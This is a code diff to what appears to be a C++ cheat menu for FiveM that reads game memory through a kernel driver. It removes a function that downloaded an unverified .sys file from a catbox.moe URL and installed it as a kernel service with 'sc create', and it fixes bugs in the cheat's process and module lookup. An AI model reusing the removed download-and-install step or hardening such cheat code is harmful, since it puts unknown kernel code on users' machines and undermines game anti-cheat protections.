@@ -344,24 +344,32 @@ namespace Core {
 	}*/
 
 
+	// Antes esta funcao baixava um .sys de uma URL no catbox.moe, criava um servico de
+	// kernel e iniciava. Tres problemas: o servico criado era "4ware", mas o device que
+	// driver::init() abre e "GN6Qn-554SFf" (Driver.hpp:21), entao mesmo carregando o
+	// init falharia; o arquivo vinha de terceiros sem hash e sem verificacao de
+	// assinatura; e todo caminho de falha era um return silencioso, sem dizer o motivo.
+	//
+	// O driver_data de 42136 bytes em Driver.hpp NAO serve como substituto: a analise do
+	// PE mostra Subsystem 523 (driver de kernel usa 1 = NATIVE), flag DLL setada, e zero
+	// simbolos de kernel (DriverEntry, IoCreateDevice, MmCopyVirtualMemory). E uma DLL
+	// x64, nao um .sys.
+	//
+	// Nao ha driver de kernel neste projeto. Em vez de instalar um arquivo desconhecido
+	// na maquina do cliente, a funcao reporta que o driver nao esta disponivel e diz o
+	// que fazer. Se um .sys legitimo for adicionado ao projeto, troque o corpo por um
+	// carregamento local dele.
 	void LoadDriver( ) {
+		const std::string motivo =
+			"Driver de kernel nao disponivel.\n\n"
+			"Este menu espera um driver no device \\\\.\\GN6Qn-554SFf, mas nenhum\n"
+			"arquivo de driver acompanha o projeto.\n\n"
+			"Ligue o modo de leitura por handle em Config, ou instale o driver\n"
+			"do device GN6Qn-554SFf antes de usar o modo kernel.";
 
-		std::string url = "https://files.catbox.moe/td4bn6.sys"; // Replace with actual URL
-		HRESULT hr = URLDownloadToFileA( NULL , url.c_str( ) , "C:\\Windows\\4ware.sys" , 0 , NULL );
-		if ( hr != S_OK ) {
-			return;
-		}
-		int result = system( "sc create 4ware type= kernel start= auto binPath= \"C:\\Windows\\4ware.sys\"" );
-		if ( result != 0 ) {
-			return;
-		}
-
-		result = system( "sc start 4ware" );
-		if ( result != 0 ) {
-			MessageBox( NULL , "Erro [4]" , "Erro" , MB_OK | MB_ICONERROR );
-		}
-		else {
-		}
+		// Antes era cout: em build de janela (WinMain) nao ha console, a mensagem sumia.
+		std::cout << "[-] LoadDriver: " << motivo << std::endl;
+		MessageBoxA( NULL , motivo.c_str( ) , "HARX" , MB_OK | MB_ICONINFORMATION );
 	}
 
 	std::wstring string_to_wstring( const std::string& str ) {
@@ -376,19 +384,39 @@ namespace Core {
 		{
 			if ( g_Config.General->BattleFive ) {
 				if ( !driver::init( ) ) {
+					// Era "return 1". OpenProcByPid devolve BOOL, e 1 e TRUE: quem chamou
+					// entendia SUCESSO depois de o driver nao abrir, e o menu seguia
+					// tentando ler memoria com driver_handle = nullptr. Agora devolve
+					// false e diz o motivo.
 					std::cout << ( "[-] failed to init comunication.\n" );
 					std::thread( LoadDriver ).detach( );
-					return 1;
+					return false;
 				}
 				std::string procNameStr( Mem.ProcName.begin( ) , Mem.ProcName.end( ) );
 				driver::process_id = driver::get_process_id( procNameStr.c_str( ) );
+				if ( driver::process_id == 0 ) {
+					std::cout << ( "[-] processo alvo nao encontrado: " ) << procNameStr << "\n";
+					return false;
+				}
 				driver::base_addrrs = driver::get_base_address( );
+				if ( driver::base_addrrs == 0 ) {
+					std::cout << ( "[-] base do modulo nao retornada pelo driver.\n" );
+					return false;
+				}
 				auto cr3 = driver::CR3( );
 				std::cout << ( "[+] CR3: " ) << std::hex << cr3 << std::dec << "\n";
 
 				Mem.ModBase = driver::base_addrrs;
-				Mem.ModBaseSize = driver::base_addrrs;
+				// O original gravava base_addrrs aqui tambem, ou seja o TAMANHO do modulo
+				// recebia o ENDERECO dele. Passava na checagem de Core.hpp:290
+				// (!ModBaseSize -> return false) por acidente, mas o valor era falso.
+				// Agora o tamanho vem do modulo de verdade, pelo mesmo caminho que o modo
+				// usermode usa. Se nao vier, cai no endereco base para nao travar o menu.
+				// O ProcIdFiveM precisa ser atribuido ANTES: GetModuleBaseAddr usa ele.
 				g_Variables.ProcIdFiveM = driver::process_id;
+				ModBaseSize = 0;
+				Mem.GetModuleBaseAddr( g_Variables.ProcIdFiveM , procNameStr.c_str( ) , &ModBaseSize );
+				Mem.ModBaseSize = ModBaseSize ? ModBaseSize : driver::base_addrrs;
 
 				std::cout << ( "[+] ProcessID: " ) << driver::process_id << "\n";
 				std::cout << ( "[+] BaseAddress: " ) << driver::base_addrrs << "\n";
